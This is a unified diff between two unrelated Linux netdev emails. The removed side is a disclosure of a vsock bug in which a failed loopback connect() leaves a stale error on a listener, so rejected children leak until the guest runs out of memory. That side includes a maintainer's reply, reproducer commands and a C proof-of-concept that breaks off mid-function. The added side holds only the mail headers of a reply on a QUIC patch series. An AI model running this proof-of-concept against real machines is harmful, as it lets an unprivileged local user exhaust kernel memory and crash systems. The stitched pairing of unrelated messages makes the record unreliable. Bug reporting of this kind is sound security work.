@@ -1,634 +1,473 @@
-Received: from mail-lf1-f47.google.com (mail-lf1-f47.google.com [209.85.167.47])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C7979439F97
-	for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 13:14:15 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.167.47
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785244459; cv=pass; b=s6Tz0e75ModTAzN9SO25CDFPNgj0eWqwNCJTT5rgEN/6ChYHef29qzXKgjsqjXt+UVeR3AAl5LynIpmhizAtG+RLuMQhru8GYvgUGPaQwYn8/OnXoBLihSiTjk9z8Ix/WxW2vQt/zApYqJirzroRKP1t/yujXuZ/8VTV38XWFk8=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785244459; c=relaxed/simple;
-	bh=YZZk8CsasDs2NhVPubSNPSGhK33Q2Ovy7C1xyfiLHJU=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=DL52ohq26kVb2EUHmsVA8bPAEokfP/YJGaRzWWiydNmjzt0vXD+zDxlHrvNMKU2csmgyXre7djiTaXJsVgrNXrcxoh8/tWmMQcFSH0yDy9b2pbr1CZDxecSV0X/YIaJyln0q/YMfjwE273TCPLOJExBeHDtlyU2Q9i2QU+5WWXA=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=WOJ+vK/D; arc=pass smtp.client-ip=209.85.167.47
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 2C32F3B8D76
+	for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 13:17:57 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.133.124
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1785244680; cv=none; b=Ie7zi/bz3sXa+KRobSKoQoBXs/hoSCa8v+4m6mqz3VLZRVP6k4+wGI2xJcUXidb1yy56K2/Gqt2DR+rrh6TfRgp541QZCldcMv4oD+f0LthXlgKNsEZzaNQeFgRLy6o0jryhScADik9K8ku+h9tBKe6X14AUHjpQkCT9MqjRrKA=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1785244680; c=relaxed/simple;
+	bh=lFn3pGe3gWPn9kOA+U7QnGTvl4jRvD2k7Df9Rn6eeZc=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=FnY7rEqe9WvAmJUR931DAAiyCw4CjLiLxgM/BN0OwZh0v9DTobpi3PgevvA0/jHXi1JH/5f2+0P24mwDrPfaypqchRpsjR8N+FZ91rNCePKVgqpnzbIfxCsVX8ZTnLxUJEoRGZOuFxwdK7jcl5M6HMJKJnVodKjiF2gzSprw4YI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=XAznCufX; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=cy78Suaq; arc=none smtp.client-ip=170.10.133.124
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="WOJ+vK/D"
-Received: by mail-lf1-f47.google.com with SMTP id 2adb3069b0e04-5b011edaf7dso3882302e87.2
-        for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 06:14:15 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1785244453; cv=none;
-        d=google.com; s=arc-20260327;
-        b=qN7qpz8wIsT/ggdle1ZGG5eRNLkMhwxKrkIFn12rDgK8mlWNNImoyY8es+LDCaxaf0
-         vT9UAV0SxC1g+SQiixRlJ3kDFsozkGHqfMfXgECo9oKHqhMTnQr/os2TFkO2nWvX+OGi
-         DvyM6WtAlsBLNzx+uUNdpdl36PJdGsqd4P/TOet7Tvvxe1gu/kkS8T2yCO4L3YAmsjxp
-         ewHQr1Mov9bKg0sWnhUegElio9cW+lRRQi9WRb+0D5FmDl15Rg6maViys1Vf6XW9hxmL
-         x9JBkjrBbaJrBa5KbWlPhKSZg3VtDYHcULMG+wZ/9l45xuOg166JYZ/HxSxuvGVdJBa4
-         FQyA==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
-        fh=uSI8bXhPWEL91t0ngvLjJBXd3qm54fWdo8hWukIkT68=;
-        b=HahD4skJMICNCEAuHTB7Hw6cMpdKK9pI3ZjxcPFsoMMMwzMPxwqpWx6fvFUVSXJIr1
-         x9wEfno5EPlR1IF5Sx1DvFY8ZOqrO6kwTwsW7mGUWFg9nI2Iewr+Lu+vjLP3Rjnhyym1
-         ukIw/4Dz6Mvq3RykstPIitOl44OViQD3zcMAu+ViZI2wMyidIilotuGRDeJRuQSo0qFT
-         A+rKYKUeYoBc5dWO3Pi4zsE4eJmSilvTxur1NApq5ioaM2ORdoQV3dSqQMBX+xb+og8h
-         p19AR7ZuOs5757Dn8rqSh3IFLVcaLzCcNBTO7o/2hjP0EozW/g8DKWt6qd8HAbn/hozh
-         Eo3g==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="XAznCufX";
+	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="cy78Suaq"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
+	s=mimecast20190719; t=1785244677;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:
+	 in-reply-to:in-reply-to:references:references;
+	bh=LZXde2S6X4gZRfxeRQHauy+S960gD6Ms5fIejZtqbaI=;
+	b=XAznCufXaQ7QspOxcEVe2dZ2qz+A4kI9zixwCCi85mLi3Y2zGLFe5A8wx99qDbIwDEcjtc
+	Iw4gOOfzCA6RFMz9yV8PSNNOb4o96XgLeHXrCnUA9JZl9jax8wRM+wRxiq/P1DGRyGqSsR
+	ITj9grkDGoegBprfttAVOyEIjLTL4kc=
+Received: from mail-wm1-f70.google.com (mail-wm1-f70.google.com
+ [209.85.128.70]) by relay.mimecast.com with ESMTP with STARTTLS
+ (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
+ us-mta-148-xio4hVLlPmqBnK_qwXFfSg-1; Tue, 28 Jul 2026 09:17:55 -0400
+X-MC-Unique: xio4hVLlPmqBnK_qwXFfSg-1
+X-Mimecast-MFC-AGG-ID: xio4hVLlPmqBnK_qwXFfSg_1785244674
+Received: by mail-wm1-f70.google.com with SMTP id 5b1f17b1804b1-4957287363bso25021615e9.0
+        for <netdev@vger.kernel.org>; Tue, 28 Jul 2026 06:17:55 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1785244453; x=1785849253; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
-        b=WOJ+vK/DDI41cAf6AUMUzGuO6GPhb3bvV4zAxGu1RQ2Egvwp99In0348Ert5qvhZMe
-         C24JnKLVf0/io8Sbbjq11K4E8jICNDKtrQurxqOjfz6vLwuTSTZkU/EyTMYk6+YtEYNZ
-         2w1xbvRx+MD0Fpdey78FslAlSZX8afoP7cctZMA5E569WO9We5CWgqyo39uFxHt/nxNw
-         eYqQE+Wi5zzOQmEOhoEtqUv566zW0ImUOtY0kX079RwRZKbkv6JQcm8cm60AGr8z3HDh
-         jiwD9UGL/JKJC8yMqiA3OqXKfxw1jxewK2azIy/wHk+hpW1KrlWJPllsJjUS1ZWZhikW
-         pjUQ==
+        d=redhat.com; s=google; t=1785244674; x=1785849474; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:in-reply-to:content-language
+         :from:references:cc:to:subject:user-agent:mime-version:date
+         :message-id:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=LZXde2S6X4gZRfxeRQHauy+S960gD6Ms5fIejZtqbaI=;
+        b=cy78SuaqivirH22jE5E+uAJ1fD+iENqdmPEB5C8XDVySKqatkS0jZaTrlCeSlMccln
+         wA6DlsFwQpELR7gSF8BryJ2KscVCMlCUdkpW7npHuaflcSPjfD6XEcmt2JIlE0FG0uSS
+         6PtEjig1vUH8nvutdRF8Bj+6JLY7qoei7DKVH1hpg9S3SEVEEYz6DK0ZliEiA+MqsCPH
+         Tu++QkeapD/pqkyXuJfLx9V3LjUhwi59PK72yOwVJi2LckIiwxXqADzFob18vHOD7xpr
+         alyQw40ugD8cl8V8GioMMpTnic2G+pV/ldzbFM0rou7S/OKTSwa0I0Z04/AMqWPDfILo
+         S/cw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785244453; x=1785849253;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=WoDGU6/VSBO+8tFqEz8+5Z6bDSqn3v/WkIncDBE1H8A=;
-        b=FfjW50ih2ZzFGBV9dDxk7ncFzsxr2h7alZBJ8344ngfRAFIIdkbVIOM3WO4no/j/mS
-         4LXSMpfYT9QPwU631dA19svLCveCOf/4PoM7uxa1Ma5K5AVM50FJJYC/l6WtEzibbxhn
-         dWm+i5bBv2h8wtfeRTTgnHxOOpJf2JCflbPDFti2bUQra8Uy6CvwVwmjwidEqWUHVwT7
-         UascPOJU4ZGU1P7TaIBcFVDtAnCyPzDdsK5ljcyHwGpTBCR+pXM3tMkrU0Si8WQt45Xm
-         7qys8RS4HQzjOZ5wTwxVDmclKfuOFBjNHG7+1X+L7kvKDDNRnq9smxukyeAlM+saVRug
-         AQQw==
-X-Forwarded-Encrypted: i=1; AHgh+RpOrRo0C0Ai+O6EYIdYNQ3MtSvVNd2ivhJRHXY07og4DyEUd87G5OvtpS9TH6Gm+K9G/2d2Z1s=@vger.kernel.org
-X-Gm-Message-State: AOJu0Yypp4MY/czwyA+0OmsjJfe79rkRRvS/LBveLr9095JpapTsgPM8
-	KpIhgGcBk1UKyZwq8pk/FQH8dJpvAFx5ygOVTpvrvrPkFj5CfZoEqxSy8mJcoqSNAhdUgSqj/O2
-	IqAQyLFgBUxhIADWg8+fKePgMlOi8F4ml8Zrph4saj9E=
-X-Gm-Gg: AR+sD11cDvTk4D6dNeun6XmH1XmgCYNGouzT5acTIJr8nmnXSxQMA70Z4xtDSOT1DfE
-	AHKspKoj8IFIpJIDyCZ6lOCm8RQKCThdAMPrIJxe5iWywN/hYofq6g9rwR2PA8ztRE8V+vXO0PK
-	/hIHOjUU6s+weCqMIJZfkdiWoYPmkSmRc3bTmOmUlKXsTZEzDvDq4Q/BBohf3MWHTac9s9KlzP7
-	Wg8X5p2qDpAsyg1PKyHHdvOiEvvteyCo09AmbUQpwFyYL7RyJEN+/DvKxbq
-X-Received: by 2002:a05:6512:308d:b0:5b1:5a31:86b2 with SMTP id
- 2adb3069b0e04-5b2d0236bf3mr538868e87.16.1785244452986; Tue, 28 Jul 2026
- 06:14:12 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1785244674; x=1785849474;
+        h=content-transfer-encoding:content-type:in-reply-to:content-language
+         :from:references:cc:to:subject:user-agent:mime-version:date
+         :message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=LZXde2S6X4gZRfxeRQHauy+S960gD6Ms5fIejZtqbaI=;
+        b=cVflV83QugZnVLLFJhg2MkLhG5VsHNsRhaJ/aaLhcFUSoayybiyXmhv/B/fshmJ7je
+         uT30n842GuyLdLHhsqhmvUxwtCLIFABPah/TqU2XOvUjwIR7q9E2wPNwv3LWttTnM4Rk
+         5TsYvkJZb7LWTZ2lnJRMTdpQgB3jNVhc1A9Ko8KcJ0tSmPbg8CVK3hQps0sy8IiM/LYY
+         z7KzAYHMoROOuAYIcvDCHb6ZRkg/Y73cLtQFwt0nlF+heQRYGvgeROm4LCohG+g/MX7U
+         7zZ4/W5CFPIkYBkCJZ/djdlHJEK3dQkq3OBiK2F8ok85PnUXI+U8uei0tZNed1QPPlKJ
+         i68g==
+X-Forwarded-Encrypted: i=1; AHgh+RpEODyhDOwejsEfG8+P/xbGtpo2vgjBtOzMhg207gbAOFj7vIkEBRSDiVjFtYtLQuyFIEbR7IU=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yy3yb86mkKyycAMdLjJzWNacHc6QLs1w3Y5cCu/RmnielCLbsAN
+	QQu+s8DBTpA/fxnei+D7YISxUQJvFstHxgOiiAygjFhE6Q1l8WlVIQAL9qe1dvwOdV3Nl65cljm
+	DQL9aGESm/wNY5cizj3MJ/iIX8rvAEA8uZAEsQ1HTvE7le1TCtZlY+EQfCg==
+X-Gm-Gg: AR+sD106b8t/yD8YovKsdy06kCLCndazrK38U5lhF9V1oOkPq8H0BCYK57avFHh55OB
+	IeAoUQ93t3jYNY2+izLUkNdtUz3XFOTZJ1Mb0RVvm+y7wMszd4yJJe5hCpd1NULb4kJ/b0afxzb
+	kWRs8MDBOOaluSUTrW+PxhaydHrRYeA408fBND06jO0+AKiQazD+4rkv0AbPlHh/HNIUdrNzIxa
+	uobHDrEH3acQeEQ68t1b/r/nxzRLRB72phI0og+KWTJ9y06lT+nH0bkYKI7iLoLSjwtZ+FJ8l95
+	MNar/2ptRrSXmAP2s11DNR1M+ygHgbOpeFcllauvgCcXSbp42+5YGmE+xPjBt2bTadnl8o+ne8Y
+	Gw1PAcdR7ucJy1gjarg+GGbsOPphJkI6d3ctsKdBEJ8KFAlxgY9ASjEPgDgt5S4aedZRU5ifrx0
+	B9yA==
+X-Received: by 2002:a05:600c:1f85:b0:495:5b02:23b0 with SMTP id 5b1f17b1804b1-496c65738fdmr26962855e9.26.1785244674006;
+        Tue, 28 Jul 2026 06:17:54 -0700 (PDT)
+X-Received: by 2002:a05:600c:1f85:b0:495:5b02:23b0 with SMTP id 5b1f17b1804b1-496c65738fdmr26961715e9.26.1785244673388;
+        Tue, 28 Jul 2026 06:17:53 -0700 (PDT)
+Received: from ?IPV6:2a0d:3344:5521:6b10:58fd:68f:7756:389d? ([2a0d:3344:5521:6b10:58fd:68f:7756:389d])
+        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-496c45cb67esm82058135e9.8.2026.07.28.06.17.50
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Tue, 28 Jul 2026 06:17:51 -0700 (PDT)
+Message-ID: <aa172687-48bc-41ca-85c8-d6d87495a8bc@redhat.com>
+Date: Tue, 28 Jul 2026 15:17:49 +0200
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <cover.1784649300.git.zihanx@nebusec.ai> <amhpGj8ikeyfYazT@sgarzare-redhat>
-In-Reply-To: <amhpGj8ikeyfYazT@sgarzare-redhat>
-From: zihan xi <zihanx@nebusec.ai>
-Date: Tue, 28 Jul 2026 21:13:58 +0800
-X-Gm-Features: AUfX_mw5h8yIiNZ-uyO2pZi9LH0nkV43yLu3FYGFDK8eCC4-eQ1YCyDYwir1mfs
-Message-ID: <CAANe3eTm6Bc5-sD7cupL6gOs6Rk3jNk_2CPgqjtusyj4O5BsLg@mail.gmail.com>
-Subject: Re: [PATCH net 0/1] vsock: clear stale sk_err before listen()
-To: Stefano Garzarella <sgarzare@redhat.com>
-Cc: Ren Wei <enjou1224z@gmail.com>, virtualization@lists.linux.dev, 
-	netdev@vger.kernel.org, davem@davemloft.net, edumazet@google.com, 
-	pabeni@redhat.com, horms@kernel.org, dtor@vmware.com, georgezhang@vmware.com, 
-	acking@vmware.com, vega@nebusec.ai
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH net-next v14 00/15] net: introduce QUIC infrastructure and
+ core subcomponents
+To: Xin Long <lucien.xin@gmail.com>, network dev <netdev@vger.kernel.org>,
+ quic@lists.linux.dev
+Cc: davem@davemloft.net, kuba@kernel.org, Eric Dumazet <edumazet@google.com>,
+ Simon Horman <horms@kernel.org>, Stefan Metzmacher <metze@samba.org>,
+ Moritz Buhl <mbuhl@openbsd.org>, Tyler Fanelli <tfanelli@redhat.com>,
+ Pengtao He <hepengtao@xiaomi.com>, Thomas Dreibholz <dreibh@simula.no>,
+ linux-cifs@vger.kernel.org, Steve French <smfrench@gmail.com>,
+ Namjae Jeon <linkinjeon@kernel.org>, Tom Talpey <tom@talpey.com>,
+ kernel-tls-handshake@lists.linux.dev, Chuck Lever <chuck.lever@oracle.com>,
+ Jeff Layton <jlayton@kernel.org>, Steve Dickson <steved@redhat.com>,
+ Hannes Reinecke <hare@suse.de>, Alexander Aring <aahringo@redhat.com>,
+ David Howells <dhowells@redhat.com>, Matthieu Baerts <matttbe@kernel.org>,
+ John Ericson <mail@johnericson.me>, Cong Wang <xiyou.wangcong@gmail.com>,
+ "D . Wythe" <alibuda@linux.alibaba.com>, Jason Baron <jbaron@akamai.com>,
+ illiliti <illiliti@protonmail.com>, Sabrina Dubroca <sd@queasysnail.net>,
+ Marcelo Ricardo Leitner <marcelo.leitner@gmail.com>,
+ Daniel Stenberg <daniel@haxx.se>,
+ Andy Gospodarek <andrew.gospodarek@broadcom.com>,
+ mef@scarletmail.rutgers.edu, paul@jakma.org
+References: <cover.1784147238.git.lucien.xin@gmail.com>
+From: Paolo Abeni <pabeni@redhat.com>
+Content-Language: en-US
+In-Reply-To: <cover.1784147238.git.lucien.xin@gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
 
-On Tue, Jul 28, 2026 at 4:38=E2=80=AFPM Stefano Garzarella <sgarzare@redhat=
-.com> wrote:
->
-> On Fri, Jul 24, 2026 at 01:21:13AM +0800, Ren Wei wrote:
-> >From: Zihan Xi <zihanx@nebusec.ai>
-> >
-> >Hi Linux kernel maintainers,
-> >
-> >We found and validated an issue in net/vmw_vsock/af_vsock.c. The bug is
-> >reachable by an unprivileged local user via AF_VSOCK loopback. We've
-> >tested it, and it should not affect any other functionality.
->
-> Please check the following patches under discusion that seem related to
-> the issue you are reporting:
-> - https://lore.kernel.org/virtualization/20260719220103.684489-1-phind.ue=
-t@gmail.com/
-> - https://lore.kernel.org/virtualization/20260727071305.45826-1-phind.uet=
-@gmail.com/
->
-> If you test it, please send a Tested-by
->
-> Thanks,
-> Stefano
->
-> >
-> >This series contains one patch:
-> >  1/1 vsock: clear stale sk_err before listen()
-> >
-> >We provide bug details, reproducer steps, and a crash log below.
-> >
-> >---- details below ----
-> >
-> >Bug details:
-> >
-> >A failed loopback connect() can leave sk_err set on a reusable AF_VSOCK
-> >socket. If userspace then calls listen() on the same socket, the stale
-> >error remains attached to the listener. A later child can still reach th=
-e
-> >accept queue, but vsock_accept() sees listener->sk_err, rejects the
-> >child, and drops only the transient accept reference.
-> >
-> >On the virtio loopback path that rejected child can remain orphaned in t=
-he
-> >vsock tables, so repeated iterations leak children and can eventually
-> >push the guest into OOM. Clearing sk_err in vsock_listen() prevents a
-> >failed connect() attempt from poisoning the next listener incarnation of
-> >that socket.
-> >
-> >On our fixed-kernel validation, the same minimal reproducer no longer hi=
-t
-> >that failed accept path and accept() returned a valid child socket.
-> >
-> >Reproducer:
-> >
-> >    cc -O2 -Wall -Wextra -pthread -o /root/poc /root/poc.c
-> >    echo 2 > /proc/sys/vm/panic_on_oom
-> >    echo 1 > /proc/sys/vm/oom_dump_tasks
-> >    /root/poc 100 44000 54000 33554432 33554432 600
-> >
-> >We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-> >
-> >------BEGIN poc.c------
-> >
-> >#define _GNU_SOURCE
-> >
-> >#include <arpa/inet.h>
-> >#include <errno.h>
-> >#include <linux/vm_sockets.h>
-> >#include <pthread.h>
-> >#include <signal.h>
-> >#include <stdbool.h>
-> >#include <stdint.h>
-> >#include <stdio.h>
-> >#include <stdlib.h>
-> >#include <string.h>
-> >#include <sys/socket.h>
-> >#include <sys/time.h>
-> >#include <sys/types.h>
-> >#include <time.h>
-> >#include <unistd.h>
-> >
-> >#define DEFAULT_BASE_PORT 40000U
-> >#define DEFAULT_FAIL_PORT 50000U
-> >#define DEFAULT_BUFFER_SIZE (32ULL * 1024 * 1024)
-> >#define DEFAULT_SEND_BYTES (32ULL * 1024 * 1024)
-> >#define DEFAULT_ITERATIONS 1U
-> >
-> >struct client_ctx {
-> >       pthread_mutex_t lock;
-> >       pthread_cond_t cond;
-> >       unsigned int server_port;
-> >       unsigned int client_port;
-> >       unsigned long long send_bytes;
-> >       unsigned long long bytes_sent;
-> >       int connect_errno;
-> >       int send_errno;
-> >       int sent_any;
-> >       int connected;
-> >       int done;
-> >       int fd;
-> >};
-> >
-> >static void die(const char *msg)
-> >{
-> >       perror(msg);
-> >       exit(EXIT_FAILURE);
-> >}
-> >
-> >static void set_vsock_u64(int fd, int optname, unsigned long long val)
-> >{
-> >       if (setsockopt(fd, AF_VSOCK, optname, &val, sizeof(val)) < 0)
-> >               die("setsockopt(AF_VSOCK)");
-> >}
-> >
-> >static void set_connect_timeout(int fd, long sec)
-> >{
-> >       struct timeval tv =3D {
-> >               .tv_sec =3D sec,
-> >               .tv_usec =3D 0,
-> >       };
-> >
-> >       if (setsockopt(fd, AF_VSOCK, SO_VM_SOCKETS_CONNECT_TIMEOUT,
-> >                      &tv, sizeof(tv)) < 0) {
-> >               die("setsockopt(SO_VM_SOCKETS_CONNECT_TIMEOUT)");
-> >       }
-> >}
-> >
-> >static void bind_vsock(int fd, unsigned int cid, unsigned int port)
-> >{
-> >       struct sockaddr_vm svm =3D {
-> >               .svm_family =3D AF_VSOCK,
-> >               .svm_cid =3D cid,
-> >               .svm_port =3D port,
-> >       };
-> >
-> >       if (bind(fd, (struct sockaddr *)&svm, sizeof(svm)) < 0)
-> >               die("bind(AF_VSOCK)");
-> >}
-> >
-> >static int connect_vsock_errno(int fd, unsigned int cid, unsigned int po=
-rt)
-> >{
-> >       struct sockaddr_vm svm =3D {
-> >               .svm_family =3D AF_VSOCK,
-> >               .svm_cid =3D cid,
-> >               .svm_port =3D port,
-> >       };
-> >
-> >       if (connect(fd, (struct sockaddr *)&svm, sizeof(svm)) =3D=3D 0)
-> >               return 0;
-> >
-> >       return errno;
-> >}
-> >
-> >static void *client_thread(void *arg)
-> >{
-> >       struct client_ctx *ctx =3D arg;
-> >       char *buf;
-> >       unsigned long long sent =3D 0;
-> >       const size_t chunk =3D 64 * 1024;
-> >       int fd;
-> >       int err;
-> >
-> >       fd =3D socket(AF_VSOCK, SOCK_STREAM, 0);
-> >       if (fd < 0)
-> >               die("client socket(AF_VSOCK)");
-> >
-> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, ctx->send_bytes)=
-;
-> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, ctx->send_bytes);
-> >       bind_vsock(fd, VMADDR_CID_LOCAL, ctx->client_port);
-> >
-> >       err =3D connect_vsock_errno(fd, VMADDR_CID_LOCAL, ctx->server_por=
-t);
-> >
-> >       pthread_mutex_lock(&ctx->lock);
-> >       ctx->fd =3D fd;
-> >       ctx->connect_errno =3D err;
-> >       ctx->connected =3D (err =3D=3D 0);
-> >       pthread_cond_broadcast(&ctx->cond);
-> >       pthread_mutex_unlock(&ctx->lock);
-> >
-> >       if (err)
-> >               return NULL;
-> >
-> >       buf =3D malloc(chunk);
-> >       if (!buf)
-> >               die("malloc");
-> >       memset(buf, 'A', chunk);
-> >
-> >       while (sent < ctx->send_bytes) {
-> >               size_t todo =3D chunk;
-> >               ssize_t rc;
-> >
-> >               if (ctx->send_bytes - sent < todo)
-> >                       todo =3D ctx->send_bytes - sent;
-> >
-> >               rc =3D send(fd, buf, todo, 0);
-> >               if (rc < 0) {
-> >                       pthread_mutex_lock(&ctx->lock);
-> >                       ctx->send_errno =3D errno;
-> >                       pthread_mutex_unlock(&ctx->lock);
-> >                       break;
-> >               }
-> >
-> >               if (rc =3D=3D 0)
-> >                       break;
-> >
-> >               sent +=3D rc;
-> >               pthread_mutex_lock(&ctx->lock);
-> >               ctx->sent_any =3D 1;
-> >               ctx->bytes_sent =3D sent;
-> >               pthread_cond_broadcast(&ctx->cond);
-> >               pthread_mutex_unlock(&ctx->lock);
-> >       }
-> >
-> >       free(buf);
-> >
-> >       pthread_mutex_lock(&ctx->lock);
-> >       ctx->done =3D 1;
-> >       pthread_cond_broadcast(&ctx->cond);
-> >       pthread_mutex_unlock(&ctx->lock);
-> >
-> >       return NULL;
-> >}
-> >
-> >static void client_ctx_init(struct client_ctx *ctx, unsigned int server_=
-port,
-> >                           unsigned int client_port,
-> >                           unsigned long long send_bytes)
-> >{
-> >       memset(ctx, 0, sizeof(*ctx));
-> >       pthread_mutex_init(&ctx->lock, NULL);
-> >       pthread_cond_init(&ctx->cond, NULL);
-> >       ctx->server_port =3D server_port;
-> >       ctx->client_port =3D client_port;
-> >       ctx->send_bytes =3D send_bytes;
-> >       ctx->fd =3D -1;
-> >}
-> >
-> >static void client_ctx_destroy(struct client_ctx *ctx)
-> >{
-> >       pthread_mutex_destroy(&ctx->lock);
-> >       pthread_cond_destroy(&ctx->cond);
-> >}
-> >
-> >static int wait_for_connect(struct client_ctx *ctx)
-> >{
-> >       int err;
-> >
-> >       pthread_mutex_lock(&ctx->lock);
-> >       while (!ctx->connected && ctx->connect_errno =3D=3D 0)
-> >               pthread_cond_wait(&ctx->cond, &ctx->lock);
-> >       err =3D ctx->connect_errno;
-> >       pthread_mutex_unlock(&ctx->lock);
-> >
-> >       return err;
-> >}
-> >
-> >static void wait_for_send_progress(struct client_ctx *ctx)
-> >{
-> >       struct timespec ts;
-> >
-> >       clock_gettime(CLOCK_REALTIME, &ts);
-> >       ts.tv_sec +=3D 2;
-> >       if (ts.tv_nsec >=3D 1000000000L) {
-> >               ts.tv_sec +=3D 1;
-> >               ts.tv_nsec -=3D 1000000000L;
-> >       }
-> >
-> >       pthread_mutex_lock(&ctx->lock);
-> >       if (!ctx->done)
-> >               pthread_cond_timedwait(&ctx->cond, &ctx->lock, &ts);
-> >       pthread_mutex_unlock(&ctx->lock);
-> >}
-> >
-> >static int prepare_listener(unsigned int server_port, unsigned int fail_=
-port,
-> >                           unsigned long long buffer_size)
-> >{
-> >       int fd;
-> >       int err;
-> >
-> >       fd =3D socket(AF_VSOCK, SOCK_STREAM, 0);
-> >       if (fd < 0)
-> >               die("listener socket(AF_VSOCK)");
-> >
-> >       set_connect_timeout(fd, 1);
-> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_MAX_SIZE, buffer_size);
-> >       set_vsock_u64(fd, SO_VM_SOCKETS_BUFFER_SIZE, buffer_size);
-> >       bind_vsock(fd, VMADDR_CID_LOCAL, server_port);
-> >
-> >       err =3D connect_vsock_errno(fd, VMADDR_CID_LOCAL, fail_port);
-> >       if (err =3D=3D 0) {
-> >               fprintf(stderr, "unexpected successful failed-connect set=
-up on port %u\n",
-> >                       fail_port);
-> >               exit(EXIT_FAILURE);
-> >       }
-> >
-> >       fprintf(stderr, "[*] setup connect() failed with errno=3D%d (%s)\=
-n",
-> >               err, strerror(err));
-> >
-> >       if (listen(fd, 1) < 0)
-> >               die("listen(AF_VSOCK)");
-> >
-> >       return fd;
-> >}
-> >
-> >static int trigger_once(unsigned int server_port, unsigned int fail_port=
-,
-> >                       unsigned int client_port,
-> >                       unsigned long long buffer_size,
-> >                       unsigned long long send_bytes)
-> >{
-> >       struct client_ctx ctx;
-> >       pthread_t tid;
-> >       int listener_fd;
-> >       int accept_fd;
-> >       int accept_errno;
-> >
